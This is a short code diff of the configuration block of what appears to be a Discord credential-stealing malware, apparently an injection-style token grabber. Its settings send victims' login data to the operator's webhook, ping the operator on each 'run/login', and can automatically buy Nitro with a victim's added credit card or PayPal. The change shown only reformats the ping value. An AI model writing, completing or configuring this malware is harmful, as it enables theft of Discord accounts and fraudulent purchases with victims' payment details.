@@ -10,7 +10,7 @@ const config = {
   webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
-  ping_val: '@1083871067786985546', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
+  ping_val: '<@1083871067786985546>', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Basicify', //name of the webhook thats gonna send the info
   embed_icon: 'https://cdn.discordapp.com/attachments/1020474639874539560/1036386536658313216/static_6.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16711680, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
